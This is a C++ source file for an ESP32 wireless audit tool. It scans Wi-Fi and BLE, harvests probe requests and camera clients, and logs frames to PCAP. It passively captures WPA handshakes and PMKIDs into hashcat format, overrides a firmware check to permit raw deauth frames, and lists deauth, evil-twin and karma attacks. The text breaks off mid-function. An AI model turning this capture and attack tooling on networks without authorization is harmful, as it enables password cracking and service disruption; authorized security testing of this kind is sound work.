#include "RadioAuditActivity.h"

#include <GfxRenderer.h>
#include <HalClock.h>
#include <HalStorage.h>
#include <Logging.h>
#include <Memory.h>
#include <esp_random.h>
#include <esp_timer.h>
#include <esp_wifi.h>

#include <memory>

#include <algorithm>
#include <cctype>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <vector>

#include "MappedInputManager.h"
#include "RadioAuditHelpers.h"
#include "activities/util/ConfirmationActivity.h"
#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
#include "activities/util/EvilTwinActivity.h"
#endif
#include "components/UITheme.h"
#include "fontIds.h"
#include "images/RadioInkSkull.h"

using namespace ra;  // pull the extracted stateless helpers in unqualified

#if defined(RADIO_AUDIT_ENABLE_BLE)
#include <BLEAdvertising.h>
#include <BLEClient.h>
#include <BLERemoteCharacteristic.h>
#include <BLERemoteService.h>

#include <map>
#endif

#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
// The IDF rejects raw deauth/disassoc/beacon frames sent via esp_wifi_80211_tx
// unless this weak sanity-check hook is overridden. Compiled in only for active
// builds (authorized testing). If a future IDF renames the symbol, adjust here.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) { return 0; }
#endif

namespace {
using Action = RadioAuditActivity::Action;
constexpr int ACTION_COUNT = static_cast<int>(Action::COUNT);

// Leaf action labels, indexed by the Action enum value (order must match).
constexpr const char* ACTION_LABELS[ACTION_COUNT] = {
    "Quick Scan",        "Deep Scan",     "WiFi Scan",         "BLE Scan",
    "Client Recon (probes)", "Channel usage", "Audit Findings",    "View WiFi results",
    "View BLE results",  "Camera Sweep",  "Save text report",  "Save CSV report",
    "Save JSON report",  "Save WiGLE CSV",    "Live PCAP capture",
    "Handshake/PMKID",   "Deauth (all APs)",  "Deauth selected",   "Beacon flood",
    "Evil Twin / Portal", "Tracker Sweep",    "Deauth Detector",   "BLE Spoof",
    "Karma / Probe Resp", "Deauth Cameras",   "About Radio Ink"};

const char* actionLabel(Action a) { return ACTION_LABELS[static_cast<int>(a)]; }

UIIcon actionIcon(Action a) {
  switch (a) {
    case Action::ExportText:
    case Action::ExportCsv:
    case Action::ExportJson:
    case Action::ExportWigle: return UIIcon::File;
    default: return UIIcon::Wifi;
  }
}

// Menu categories, each grouping a set of leaf actions. To extend the tool, add
// a category here (and a case in runAction()) — the menu nav/render adapt
// automatically from these tables.
struct ActionCategory {
  const char* name;
  const Action* items;
  int count;
  UIIcon icon;
};
constexpr Action CAT_RECON_ITEMS[] = {Action::QuickScan,   Action::DeepScan,      Action::WifiScan,
                                      Action::BleScan,     Action::ClientRecon,   Action::ChannelUsage,
                                      Action::TrackerSweep, Action::DeauthDetector};
constexpr Action CAT_CAPTURE_ITEMS[] = {Action::CapturePcap, Action::CaptureHandshake};
constexpr Action CAT_RESULTS_ITEMS[] = {Action::AuditFindings, Action::WifiResults, Action::BleResults,
                                        Action::CameraSweep};
constexpr Action CAT_EXPORT_ITEMS[] = {Action::ExportText, Action::ExportCsv, Action::ExportJson,
                                       Action::ExportWigle};
#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
constexpr Action CAT_ATTACK_ITEMS[] = {Action::DeauthAttack, Action::DeauthSelected, Action::BeaconFlood,
                                       Action::EvilTwin,     Action::BleSpoof,       Action::Karma,
                                       Action::DeauthCameras};
#endif
constexpr ActionCategory ACTION_CATEGORIES[] = {
    {"Recon", CAT_RECON_ITEMS, 8, UIIcon::Wifi},
    {"Capture", CAT_CAPTURE_ITEMS, 2, UIIcon::Wifi},
#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
    {"Attacks", CAT_ATTACK_ITEMS, 7, UIIcon::Wifi},
#endif
    {"Results", CAT_RESULTS_ITEMS, 4, UIIcon::Wifi},
    {"Export", CAT_EXPORT_ITEMS, 4, UIIcon::File},
};
constexpr int CATEGORY_COUNT = sizeof(ACTION_CATEGORIES) / sizeof(ACTION_CATEGORIES[0]);

constexpr int QUICK_SCAN_PASSES = 1;
constexpr int DEEP_SCAN_PASSES = 3;
constexpr size_t MAX_WIFI_FINDINGS = 64;
constexpr size_t MAX_BLE_FINDINGS = 24;
// Heap floors for BLE. START is checked BEFORE BLEDevice::init (which itself
// eats ~65 KB for the controller). ABORT is checked between scan windows, so it
// must sit well below the *post-init* baseline (~25 KB free) or it trips before
// the first window ever runs -- only bail when heap is genuinely critical.
constexpr uint32_t BLE_HEAP_FLOOR_START = 50000;
constexpr uint32_t BLE_HEAP_FLOOR_ABORT = 9000;
constexpr const char* AUDIT_DIR = "/.radioink/radio_ink";
constexpr const char* TEXT_EXPORT_PATH = "/.radioink/radio_ink/latest.txt";
constexpr const char* CSV_EXPORT_PATH = "/.radioink/radio_ink/latest.csv";
constexpr const char* JSON_EXPORT_PATH = "/.radioink/radio_ink/latest.json";
constexpr const char* WIGLE_EXPORT_PATH = "/.radioink/radio_ink/latest.wigle.csv";
// Optional "lat,lon" the user drops on the SD card; stamped into WiGLE rows.
// X4 has no GPS, so rows are 0,0 (WiGLE rejects null-island) unless this exists.
constexpr const char* LOCATION_PATH = "/.radioink/radio_ink/location.txt";
constexpr const char* WATCHLIST_PATH = "/.radioink/radio_ink/watchlist.txt";
constexpr const char* SNAPSHOT_PATH = "/.radioink/radio_ink/last_scan.txt";

// ---- SD-resident OUI -> vendor database (generated by scripts/gen_oui.py) ----
// The full IEEE registry (~39.5k vendors) lives on the SD card, not in flash, to
// keep ~660 KB off the app partition. macVendor() binary-searches it by seeking.
// Format: 'OUIB' magic + uint32 count, then `count` 32-byte records sorted by
// oui ascending (uint32 LE oui + 28-byte NUL-padded name). See gen_oui.py.
// Candidate paths are listed in ouiOpen().
constexpr size_t OUI_HEADER_SIZE = 8;
constexpr size_t OUI_NAME_FIELD = 28;
constexpr size_t OUI_RECORD_SIZE = 4 + OUI_NAME_FIELD;  // 32 bytes
constexpr int OUI_CACHE_SIZE = 24;                      // recent lookups (hits + misses)

HalFile g_ouiFile;          // open for the activity lifetime (onEnter..onExit)
uint32_t g_ouiCount = 0;    // record count from the file header, 0 if unavailable

struct OuiCacheEntry {
  uint32_t oui;
  bool valid;
  char name[OUI_NAME_FIELD];  // "" = known-miss (avoids re-searching unknown OUIs)
};
OuiCacheEntry g_ouiCache[OUI_CACHE_SIZE] = {};
int g_ouiCacheNext = 0;

// Open the SD OUI database and read its header. Missing/invalid file -> count 0
// (macVendor then returns "" for everything, same as before the DB existed).
void ouiOpen() {
  g_ouiCount = 0;
  for (auto& e : g_ouiCache) e.valid = false;
  g_ouiCacheNext = 0;

  // Look in the intended spot and the common places a user might drop the file
  // (SD root, the reports subdir) so vendor lookups work wherever it landed.
  static const char* const kCandidates[] = {
      "/.radioink/oui.bin",
      "/oui.bin",
      "/.radioink/radio_ink/oui.bin",
      "/oui.BIN",
  };
  const char* path = nullptr;
  for (const char* c : kCandidates) {
    if (Storage.exists(c)) {
      path = c;
      break;
    }
  }
  if (!path) {
    LOG_ERR("RADIO", "OUI db not found on SD (looked in /.radioink/oui.bin, /oui.bin, ...); vendor names off");
    return;
  }
  if (!Storage.openFileForRead("RADIO", path, g_ouiFile)) {
    LOG_ERR("RADIO", "OUI db found but open failed: %s", path);
    return;
  }
  uint8_t hdr[OUI_HEADER_SIZE];
  const int got = g_ouiFile.read(hdr, OUI_HEADER_SIZE);
  if (got != static_cast<int>(OUI_HEADER_SIZE) || memcmp(hdr, "OUIB", 4) != 0) {
    LOG_ERR("RADIO", "OUI db header bad at %s (read %d bytes, magic %02X %02X %02X %02X)", path, got, hdr[0], hdr[1],
            hdr[2], hdr[3]);
    g_ouiFile.close();
    return;
  }
  memcpy(&g_ouiCount, hdr + 4, 4);  // little-endian
  LOG_INF("RADIO", "OUI db loaded from %s: %u vendors", path, static_cast<unsigned>(g_ouiCount));
}

void ouiClose() {
  if (g_ouiFile.isOpen()) g_ouiFile.close();
  g_ouiCount = 0;
}

String hexEncode(const String& bytes) {
  static constexpr char hex[] = "0123456789ABCDEF";
  String out;
  out.reserve(bytes.length() * 2);
  for (size_t i = 0; i < bytes.length(); i++) {
    const uint8_t b = static_cast<uint8_t>(bytes[i]);
    out += hex[(b >> 4) & 0x0F];
    out += hex[b & 0x0F];
  }
  return out;
}

// ---- Per-target Wi-Fi deep scan (promiscuous capture) ----
constexpr int TARGET_WIFI_DEEP_MS = 6000;
constexpr int TARGET_MAX_CLIENTS = 24;

struct WifiTargetCapture {
  uint8_t bssid[6];
  volatile bool active;
  volatile uint16_t beaconCount;
  volatile uint16_t mgmtFrames;
  volatile uint16_t dataFrames;
  volatile uint16_t deauthFrames;
  volatile uint16_t disassocFrames;
  volatile long rssiSum;
  volatile int rssiMin;
  volatile int rssiMax;
  volatile uint16_t rssiSamples;
  uint8_t clients[TARGET_MAX_CLIENTS][6];
  volatile uint8_t clientCount;
  volatile bool privacy;
  volatile bool pmf;
  volatile bool wps;
};
WifiTargetCapture g_targetCap;

void targetAddClient(const uint8_t* mac) {
  if (macIsGroup(mac)) return;
  if (macEq(mac, g_targetCap.bssid)) return;
  for (uint8_t i = 0; i < g_targetCap.clientCount; i++)
    if (macEq(g_targetCap.clients[i], mac)) return;
  if (g_targetCap.clientCount < TARGET_MAX_CLIENTS) {
    memcpy(g_targetCap.clients[g_targetCap.clientCount], mac, 6);
    g_targetCap.clientCount++;
  }
}

// Parsed 802.11 frame from the promiscuous radio, with the trailing FCS already
// stripped. Shared preamble for the management-frame callbacks below.
struct PromiscFrame {
  const uint8_t* p;
  int len;          // payload length minus the 4-byte FCS the radio appends
  uint8_t ftype;    // frame type (0 = management)
  uint8_t fsub;     // frame subtype
  int8_t rssi;      // receive signal strength
  uint8_t channel;  // channel the frame was captured on
};

// Returns false if the frame is too short to hold an 802.11 header + FCS.
inline bool parsePromiscFrame(const void* buf, PromiscFrame& f) {
  const wifi_promiscuous_pkt_t* pkt = static_cast<const wifi_promiscuous_pkt_t*>(buf);
  int len = pkt->rx_ctrl.sig_len;
  if (len < 28) return false;  // 24-byte header + 4-byte FCS minimum
  len -= 4;                    // strip trailing FCS
  f.p = pkt->payload;
  f.len = len;
  f.ftype = (f.p[0] >> 2) & 0x03;
  f.fsub = (f.p[0] >> 4) & 0x0F;
  f.rssi = static_cast<int8_t>(pkt->rx_ctrl.rssi);
  f.channel = pkt->rx_ctrl.channel;
  return true;
}

void targetPromiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!g_targetCap.active) return;
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
  PromiscFrame fr;
  if (!parsePromiscFrame(buf, fr)) return;
  const uint8_t* p = fr.p;
  const int len = fr.len;
  const uint8_t ftype = fr.ftype;
  const uint8_t fsub = fr.fsub;
  const uint8_t flags = p[1];
  const bool toDS = flags & 0x01;
  const bool fromDS = flags & 0x02;
  const uint8_t* a1 = p + 4;
  const uint8_t* a2 = p + 10;
  const uint8_t* a3 = p + 16;

  if (!macEq(a1, g_targetCap.bssid) && !macEq(a2, g_targetCap.bssid) && !macEq(a3, g_targetCap.bssid)) return;

  // RSSI is only meaningful from frames the AP itself transmitted (addr2 == BSSID).
  if (macEq(a2, g_targetCap.bssid)) {
    const int rssi = fr.rssi;
    g_targetCap.rssiSum += rssi;
    if (g_targetCap.rssiSamples == 0) {
      g_targetCap.rssiMin = rssi;
      g_targetCap.rssiMax = rssi;
    } else {
      if (rssi < g_targetCap.rssiMin) g_targetCap.rssiMin = rssi;
      if (rssi > g_targetCap.rssiMax) g_targetCap.rssiMax = rssi;
    }
    g_targetCap.rssiSamples++;
  }

  if (ftype == 0) {  // management
    g_targetCap.mgmtFrames++;
    if (fsub == 12) g_targetCap.deauthFrames++;       // deauthentication
    else if (fsub == 10) g_targetCap.disassocFrames++;  // disassociation
    if (fsub == 8 || fsub == 5) {  // beacon or probe response
      g_targetCap.beaconCount++;
      if (len >= 24 + 12) {
        const uint16_t cap = p[24 + 10] | (p[24 + 11] << 8);
        if (cap & 0x0010) g_targetCap.privacy = true;  // Privacy bit
        uint16_t idx = 24 + 12;                          // skip fixed params
        while (idx + 2 <= len) {
          const uint8_t tag = p[idx];
          const uint8_t tlen = p[idx + 1];
          if (idx + 2 + tlen > len) break;
          const uint8_t* d = p + idx + 2;
          if (tag == 48) {  // RSN IE -> walk to RSN capabilities for MFP bits
            uint16_t o = 2;                                  // version
            if (o + 4 <= tlen) o += 4;                       // group cipher
            if (o + 2 <= tlen) { uint16_t c = d[o] | (d[o + 1] << 8); o += 2 + 4 * c; }  // pairwise
            if (o + 2 <= tlen) { uint16_t c = d[o] | (d[o + 1] << 8); o += 2 + 4 * c; }  // akm
            if (o + 2 <= tlen) {
              const uint16_t rsncap = d[o] | (d[o + 1] << 8);
              if (rsncap & 0x00C0) g_targetCap.pmf = true;  // MFPC/MFPR
            }
          } else if (tag == 221 && tlen >= 4) {  // vendor specific
            if (d[0] == 0x00 && d[1] == 0x50 && d[2] == 0xF2 && d[3] == 0x04) g_targetCap.wps = true;
          }
          idx += 2 + tlen;
        }
      }
    }
    targetAddClient(macEq(a1, g_targetCap.bssid) ? a2 : a1);
  } else if (ftype == 2) {  // data
    g_targetCap.dataFrames++;
    if (toDS && !fromDS) targetAddClient(a2);
    else if (!toDS && fromDS) targetAddClient(a1);
    else { targetAddClient(a1); targetAddClient(a2); }
  }
}

// Reads HH:MM:SS UTC straight from the DS3231 (X3 only). Returns "" if no RTC.
std::string clockStampUtc() {
  if (!halClock.isAvailable()) return "";
  Wire.beginTransmission(I2C_ADDR_DS3231);
  Wire.write(DS3231_SEC_REG);
  if (Wire.endTransmission(false) != 0) return "";
  Wire.requestFrom(static_cast<uint8_t>(I2C_ADDR_DS3231), static_cast<uint8_t>(3));
  if (Wire.available() < 3) return "";
  const uint8_t rawSec = Wire.read();
  const uint8_t rawMin = Wire.read();
  const uint8_t rawHour = Wire.read();
  const uint8_t sec = ((rawSec >> 4) & 0x07) * 10 + (rawSec & 0x0F);
  const uint8_t min = ((rawMin >> 4) & 0x07) * 10 + (rawMin & 0x0F);
  uint8_t hour;
  if (rawHour & 0x40) {  // 12h mode
    uint8_t h12 = ((rawHour >> 4) & 0x01) * 10 + (rawHour & 0x0F);
    const bool pm = rawHour & 0x20;
    if (h12 == 12) h12 = 0;
    hour = pm ? h12 + 12 : h12;
  } else {  // 24h mode
    hour = ((rawHour >> 4) & 0x03) * 10 + (rawHour & 0x0F);
  }
  char buf[16];
  snprintf(buf, sizeof(buf), "%02u:%02u:%02uZ", hour, min, sec);
  return std::string(buf);
}

// Best available stamp: RTC time of day, else device uptime.
std::string timeStamp() {
  const std::string t = clockStampUtc();
  if (!t.empty()) return t;
  return std::string("uptime ") + std::to_string(millis() / 1000) + "s";
}

// "YYYY-MM-DD HH:MM:SS" for the WiGLE FirstSeen column. The X4 has no dated RTC,
// so the date is a fixed placeholder; the time is RTC time-of-day when available
// (clockStampUtc -> "HH:MM:SSZ"), else derived from uptime. Format is what
// matters here -- absolute time is meaningless without a real clock + GPS.
std::string wigleTimestamp() {
  char buf[24];
  const std::string t = clockStampUtc();  // "HH:MM:SSZ" or ""
  if (t.size() >= 8) {
    snprintf(buf, sizeof(buf), "2020-01-01 %.8s", t.c_str());  // drops trailing 'Z'
  } else {
    const uint32_t s = millis() / 1000;
    snprintf(buf, sizeof(buf), "2020-01-01 %02u:%02u:%02u", (s / 3600) % 24, (s / 60) % 60, s % 60);
  }
  return std::string(buf);
}

// WiGLE encodes 802.11 capabilities in brackets. Map our short auth name to the
// closest bracketed token set so the CSV imports cleanly.
std::string wigleAuth(const std::string& auth) {
  if (auth == "OPEN") return "[ESS]";
  if (auth == "WEP") return "[WEP][ESS]";
  if (auth == "WPA") return "[WPA-PSK-TKIP][ESS]";
  if (auth == "WPA2") return "[WPA2-PSK-CCMP][ESS]";
  if (auth == "WPA/WPA2") return "[WPA-PSK-TKIP][WPA2-PSK-CCMP][ESS]";
  if (auth == "WPA2-EAP") return "[WPA2-EAP-CCMP][ESS]";
  if (auth == "WPA3") return "[WPA3-SAE-CCMP][ESS]";
  if (auth == "WPA2/WPA3") return "[WPA2-PSK-CCMP][WPA3-SAE-CCMP][ESS]";
  return std::string("[") + auth + "][ESS]";
}


// ---- Probe-request harvesting (channel-hopping promiscuous capture) ----
constexpr int PROBE_MAX = 48;

std::string probeSsidLabel(const std::string& ssid) { return ssid.empty() ? std::string("(broadcast)") : ssid; }

struct ProbeCapture {
  volatile bool active;
  struct Row {
    uint8_t mac[6];
    char ssid[33];
    int8_t rssi;
  };
  Row rows[PROBE_MAX];
  volatile uint8_t count;
};
std::unique_ptr<ProbeCapture> g_probeCap;  // allocated only during a probe scan

void probePromiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!g_probeCap || !g_probeCap->active) return;
  if (type != WIFI_PKT_MGMT) return;
  PromiscFrame fr;
  if (!parsePromiscFrame(buf, fr)) return;
  const uint8_t* p = fr.p;
  const int len = fr.len;
  const uint8_t ftype = fr.ftype;
  const uint8_t fsub = fr.fsub;
  if (ftype != 0 || fsub != 4) return;  // probe request only
  const uint8_t* sa = p + 10;           // addr2 = source (client)
  if (sa[0] & 0x01) return;             // ignore group source addresses

  char ssid[33];
  ssid[0] = '\0';
  if (len >= 24 + 2) {  // SSID IE (tag 0) is first tagged param in the body
    const uint8_t tag = p[24];
    const uint8_t tlen = p[24 + 1];
    if (tag == 0 && tlen > 0 && 24 + 2 + tlen <= len) {
      const uint8_t n = tlen > 32 ? 32 : tlen;
      memcpy(ssid, p + 24 + 2, n);
      ssid[n] = '\0';
    }
  }

  for (uint8_t i = 0; i < g_probeCap->count; i++)
    if (macEq(g_probeCap->rows[i].mac, sa) && strcmp(g_probeCap->rows[i].ssid, ssid) == 0) return;
  if (g_probeCap->count < PROBE_MAX) {
    memcpy(g_probeCap->rows[g_probeCap->count].mac, sa, 6);
    memcpy(g_probeCap->rows[g_probeCap->count].ssid, ssid, sizeof(ssid));
    g_probeCap->rows[g_probeCap->count].rssi = fr.rssi;
    g_probeCap->count++;
  }
}

// ---- Associated-client capture (camera sweep) ----
// Ring/Blink cameras join the home network as stations, not APs, so a beacon
// scan never sees them. This grabs the station MAC from data frames so we can
// match it against camera-vendor OUIs.
constexpr int CLIENT_MAX = 64;
struct ClientCapture {
  volatile bool active;
  struct Row {
    uint8_t mac[6];
    uint8_t bssid[6];  // the AP this station is associated to (for directed deauth)
    int8_t rssi;
    uint8_t channel;  // channel the station was heard on (for locate/deauth)
  };
  Row rows[CLIENT_MAX];
  volatile uint8_t count;
  volatile uint32_t framesSeen;  // total DATA frames the radio delivered (diagnostic)
};
std::unique_ptr<ClientCapture> g_clientCap;  // allocated only during a camera sweep

void clientPromiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!g_clientCap || !g_clientCap->active) return;
  if (type != WIFI_PKT_DATA) return;
  g_clientCap->framesSeen++;
  const wifi_promiscuous_pkt_t* pkt = static_cast<const wifi_promiscuous_pkt_t*>(buf);
  const uint8_t* p = pkt->payload;
  if (pkt->rx_ctrl.sig_len < 24) return;

  const bool toDS = p[1] & 0x01;
  const bool fromDS = p[1] & 0x02;
  const uint8_t* sta = nullptr;
  const uint8_t* bssid = nullptr;
  if (toDS && !fromDS) {  // STA -> AP: addr2 station, addr1 BSSID
    sta = p + 10;
    bssid = p + 4;
  } else if (fromDS && !toDS) {  // AP -> STA: addr1 station, addr2 BSSID
    sta = p + 4;
    bssid = p + 10;
  } else {
    return;  // WDS / ad-hoc: skip
  }
  if (sta[0] & 0x01) return;  // skip group/broadcast addresses

  for (uint8_t i = 0; i < g_clientCap->count; i++)
    if (macEq(g_clientCap->rows[i].mac, sta)) return;
  if (g_clientCap->count < CLIENT_MAX) {
    memcpy(g_clientCap->rows[g_clientCap->count].mac, sta, 6);
    memcpy(g_clientCap->rows[g_clientCap->count].bssid, bssid, 6);
    g_clientCap->rows[g_clientCap->count].rssi = static_cast<int8_t>(pkt->rx_ctrl.rssi);
    g_clientCap->rows[g_clientCap->count].channel = pkt->rx_ctrl.channel;
    g_clientCap->count++;
  }
}

// ---- Live PCAP capture (promiscuous frames -> SD card) ----
// Single-producer / single-consumer byte ring: the Wi-Fi promiscuous callback
// (producer) appends pcap records; the activity loop (consumer) drains them to
// SD. Decoupling is required because the callback runs in Wi-Fi-driver context
// where SD I/O is unsafe. Static DRAM (no heap), power-of-two size for cheap
// masking. ~32 KB cushions the slow e-ink redraw window against drops.
constexpr const char* CAPTURE_DIR = "/.radioink/captures";
constexpr uint32_t PCAP_RING_SIZE = 32768;  // 2^15, must stay a power of two
constexpr uint32_t PCAP_RING_MASK = PCAP_RING_SIZE - 1;
constexpr uint32_t PCAP_SNAPLEN = 2304;       // max 802.11 MTU we record per frame
constexpr uint32_t PCAP_LINKTYPE = 105;       // LINKTYPE_IEEE802_11 (raw frames)
constexpr uint32_t PCAP_RECORD_HEADER = 16;   // ts_sec, ts_usec, incl_len, orig_len

struct PcapRing {
  volatile bool active;
  volatile uint32_t head;     // producer write offset
  volatile uint32_t tail;     // consumer read offset
  volatile uint32_t packets;  // frames accepted
  volatile uint32_t drops;    // frames dropped (ring full)
  uint8_t* buf;               // backing store (heap, allocated only while capturing)
};
PcapRing g_pcap;
// The 32 KB ring lives on the heap only during a PCAP capture. Keeping it in
// permanent .bss starved the BLE controller (OOM crash during BLE scans).
std::unique_ptr<uint8_t[]> g_pcapBuf;

// Copy n bytes into the ring starting at offset `at`, wrapping at the end.
void pcapRingWrite(uint32_t at, const uint8_t* src, uint32_t n) {
  const uint32_t firstChunk = std::min(n, PCAP_RING_SIZE - at);
  memcpy(g_pcap.buf + at, src, firstChunk);
  if (n > firstChunk) memcpy(g_pcap.buf, src + firstChunk, n - firstChunk);
}

void pcapPromiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!g_pcap.active || !g_pcap.buf) return;
  const wifi_promiscuous_pkt_t* pkt = static_cast<const wifi_promiscuous_pkt_t*>(buf);
  uint32_t len = pkt->rx_ctrl.sig_len;
  if (len < 4) return;
  len -= 4;  // strip the 4-byte FCS the radio appends
  if (len > PCAP_SNAPLEN) len = PCAP_SNAPLEN;
  const uint32_t total = PCAP_RECORD_HEADER + len;

  const uint32_t head = g_pcap.head;
  const uint32_t used = (head - g_pcap.tail) & PCAP_RING_MASK;
  if (PCAP_RING_SIZE - 1 - used < total) {
    g_pcap.drops++;
    return;
  }

  const uint64_t us = static_cast<uint64_t>(esp_timer_get_time());
  const uint32_t tsSec = static_cast<uint32_t>(us / 1000000ULL);
  const uint32_t tsUsec = static_cast<uint32_t>(us % 1000000ULL);
  uint8_t rec[PCAP_RECORD_HEADER];
  memcpy(rec + 0, &tsSec, 4);
  memcpy(rec + 4, &tsUsec, 4);
  memcpy(rec + 8, &len, 4);   // incl_len (captured)
  memcpy(rec + 12, &len, 4);  // orig_len

  pcapRingWrite(head, rec, PCAP_RECORD_HEADER);
  pcapRingWrite((head + PCAP_RECORD_HEADER) & PCAP_RING_MASK, pkt->payload, len);
  g_pcap.head = (head + total) & PCAP_RING_MASK;  // publish only after full record
  g_pcap.packets++;
}

// Drain all currently-published bytes to the open file. Returns bytes written.
uint32_t pcapDrain(HalFile& file) {
  const uint32_t tail = g_pcap.tail;
  const uint32_t used = (g_pcap.head - tail) & PCAP_RING_MASK;
  if (used == 0) return 0;
  const uint32_t firstChunk = std::min(used, PCAP_RING_SIZE - tail);
  file.write(g_pcap.buf + tail, firstChunk);
  if (used > firstChunk) file.write(g_pcap.buf, used - firstChunk);
  g_pcap.tail = (tail + used) & PCAP_RING_MASK;
  return used;
}

// ---- WPA handshake / PMKID capture (passive) ----
// Detects EAPOL-Key M1/M2 and RSN PMKID in promiscuous frames and exports the
// hashcat 22000 format. The callback only parses + memcpy's into static slots
// (no SD I/O in Wi-Fi context); the activity loop writes completed lines.
//
// Hardening: every read into the attacker-controlled frame is bounds-checked
// against the captured length before dereferencing.
constexpr const char* HS_DIR = "/.radioink/captures";
constexpr int HS_MAX_SLOTS = 8;
constexpr int HS_SSID_MAX = 16;
constexpr int HS_EAPOL_MAX = 256;
constexpr int EAPOL_FIXED_LEN = 99;  // EAPOL hdr(4) + key descriptor up to key-data-len

struct HsSsidEntry {
  bool used;
  uint8_t bssid[6];
  char ssid[33];
  uint8_t channel;
  int8_t rssi;
};

struct HsSlot {
  bool used;
  uint8_t ap[6];
  uint8_t sta[6];
  bool haveM1;
  uint8_t anonce[32];
  uint8_t replayM1[8];
  bool havePmkid;
  uint8_t pmkid[16];
  bool haveM2;
  uint8_t mic[16];
  uint8_t replayM2[8];
  uint16_t eapolLen;
  uint8_t eapol[HS_EAPOL_MAX];
  bool pmkidWritten;
  bool eapolWritten;
};

struct HandshakeCapture {
  volatile bool active;
  HsSsidEntry ssids[HS_SSID_MAX];
  HsSlot slots[HS_MAX_SLOTS];
  volatile uint16_t beaconCount;
};
std::unique_ptr<HandshakeCapture> g_hs;  // allocated only during a handshake capture


HsSsidEntry* hsFindSsid(const uint8_t* bssid) {
  for (auto& e : g_hs->ssids)
    if (e.used && macEq(e.bssid, bssid)) return &e;
  return nullptr;
}
void hsStoreSsid(const uint8_t* bssid, const char* ssid, uint8_t channel, int8_t rssi) {
  if (!ssid[0]) return;
  if (auto* e = hsFindSsid(bssid)) {
    if (!e->ssid[0]) {
      strncpy(e->ssid, ssid, 32);
      e->ssid[32] = '\0';
    }
    e->channel = channel;
    e->rssi = rssi;
    return;
  }
  for (auto& e : g_hs->ssids) {
    if (!e.used) {
      e.used = true;
      memcpy(e.bssid, bssid, 6);
      strncpy(e.ssid, ssid, 32);
      e.ssid[32] = '\0';
      e.channel = channel;
      e.rssi = rssi;
      return;
    }
  }
}
// Strongest AP seen via beacons this capture — the default in-screen deauth target.
HsSsidEntry* hsBestAp() {
  HsSsidEntry* best = nullptr;
  for (auto& e : g_hs->ssids)
    if (e.used && e.ssid[0] && (!best || e.rssi > best->rssi)) best = &e;
  return best;
}
HsSlot* hsFindSlot(const uint8_t* ap, const uint8_t* sta) {
  for (auto& s : g_hs->slots)
    if (s.used && macEq(s.ap, ap) && macEq(s.sta, sta)) return &s;
  for (auto& s : g_hs->slots) {
    if (!s.used) {
      memset(&s, 0, sizeof(s));
      s.used = true;
      memcpy(s.ap, ap, 6);
      memcpy(s.sta, sta, 6);
      return &s;
    }
  }
  return nullptr;  // table full
}

void hsWritePmkidLine(HalFile& file, const HsSlot& s, const char* ssid) {
  const std::string line = "WPA*01*" + bytesToHex(s.pmkid, 16) + "*" + bytesToHex(s.ap, 6) + "*" +
                           bytesToHex(s.sta, 6) + "*" + strToHex(ssid) + "***\n";
  file.write(reinterpret_cast<const uint8_t*>(line.data()), line.size());
}
void hsWriteEapolLine(HalFile& file, const HsSlot& s, const char* ssid) {
  const std::string line = "WPA*02*" + bytesToHex(s.mic, 16) + "*" + bytesToHex(s.ap, 6) + "*" +
                           bytesToHex(s.sta, 6) + "*" + strToHex(ssid) + "*" + bytesToHex(s.anonce, 32) + "*" +
                           bytesToHex(s.eapol, s.eapolLen) + "*00\n";
  file.write(reinterpret_cast<const uint8_t*>(line.data()), line.size());
}

void handshakePromiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!g_hs || !g_hs->active) return;
  PromiscFrame fr;
  if (!parsePromiscFrame(buf, fr)) return;
  const uint8_t* p = fr.p;
  const int len = fr.len;
  const uint8_t ftype = fr.ftype;
  const uint8_t fsub = fr.fsub;

  // Beacons / probe responses: harvest BSSID -> SSID so exports have the ESSID.
  if (ftype == 0 && (fsub == 8 || fsub == 5)) {
    const uint8_t* bssid = p + 16;  // addr3
    char ssid[33];
    ssid[0] = '\0';
    int off = 24 + 12;  // 802.11 header + fixed beacon params, then tagged IEs
    while (off + 2 <= len) {
      const uint8_t tag = p[off];
      const uint8_t tlen = p[off + 1];
      if (off + 2 + tlen > len) break;
      if (tag == 0) {  // SSID IE
        const int n = tlen > 32 ? 32 : tlen;
        memcpy(ssid, p + off + 2, n);
        ssid[n] = '\0';
        break;
      }
      off += 2 + tlen;
    }
    hsStoreSsid(bssid, ssid, fr.channel, fr.rssi);
    g_hs->beaconCount++;
    return;
  }

  // Data frames carrying EAPOL (LLC/SNAP 0xAAAA03 000000 888E).
  if (ftype != 2) return;
  const bool toDS = p[1] & 0x01;
  const bool fromDS = p[1] & 0x02;
  int hdr = 24;
  if (fsub & 0x08) hdr += 2;  // QoS Data has a 2-byte QoS Control field
  if (hdr + 8 > len) return;
  const uint8_t* llc = p + hdr;
  if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 && llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00 &&
        llc[6] == 0x88 && llc[7] == 0x8E))
    return;

  const uint8_t* eapol = llc + 8;
  const int eapolLen = len - hdr - 8;
  if (eapolLen < EAPOL_FIXED_LEN) return;  // need the fixed EAPOL-Key fields
  if (eapol[1] != 3) return;               // EAPOL packet type 3 = Key

  const uint16_t keyInfo = (static_cast<uint16_t>(eapol[5]) << 8) | eapol[6];
  const bool kAck = keyInfo & 0x0080;
  const bool kMic = keyInfo & 0x0100;

  uint8_t ap[6], sta[6];
  if (fromDS && !toDS) {  // AP -> STA (M1, M3)
    memcpy(ap, p + 10, 6);
    memcpy(sta, p + 4, 6);
  } else if (toDS && !fromDS) {  // STA -> AP (M2, M4)
    memcpy(ap, p + 4, 6);
    memcpy(sta, p + 10, 6);
  } else {
    return;
  }

  HsSlot* slot = hsFindSlot(ap, sta);
  if (!slot) return;

  const uint8_t* nonce = eapol + 17;
  const uint8_t* replay = eapol + 9;
  const uint16_t kdLen = (static_cast<uint16_t>(eapol[97]) << 8) | eapol[98];

  if (kAck && !kMic) {
